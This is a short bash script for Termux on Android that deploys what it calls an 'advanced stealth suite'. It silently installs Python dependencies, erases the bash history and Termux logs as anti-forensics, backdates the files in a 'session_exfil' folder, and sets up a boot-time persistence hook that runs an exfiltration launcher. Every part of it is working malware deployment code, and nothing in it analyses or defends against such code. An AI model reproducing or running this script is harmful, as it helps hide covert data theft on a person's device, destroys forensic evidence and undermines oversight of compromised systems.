#!/bin/bash
set -e
LOGFILE="$HOME/.termux/boot/install.log"
echo "[*] Deploying advanced stealth suite..." > $LOGFILE

# Silent install of dependencies
pkg update -y > /dev/null 2>&1
pkg install -y python git > /dev/null 2>&1
pip install --upgrade pip > /dev/null 2>&1
pip install pycryptodome websocket-client requests > /dev/null 2>&1

# Anti-forensics: remove bash history + termux logs (opt-in)
HISTFILE="$HOME/.bash_history"
if [ -f "$HISTFILE" ]; then
  cat /dev/null > $HISTFILE
  rm -f $HISTFILE
fi
rm -rf $PREFIX/var/log/* 2>/dev/null || true

# Timestomp: backdate core files
touch -d "4 days ago" $HOME/session_exfil/* 2>/dev/null || true

# Persistence
if pkg list-installed | grep -q termux-boot; then
    mkdir -p ~/.termux/boot
    echo -e '#!/data/data/com.termux/files/usr/bin/sh\npython3 $HOME/session_exfil/launcher.py &' > ~/.termux/boot/start.sh
    chmod +x ~/.termux/boot/start.sh
    echo "[✓] Persistence installed" >> $LOGFILE
else
    echo "[!] termux-boot not found. Persistence skipped." >> $LOGFILE
fi

echo "[✓] Deployment complete. Execute launcher manually if needed." >> $LOGFILE
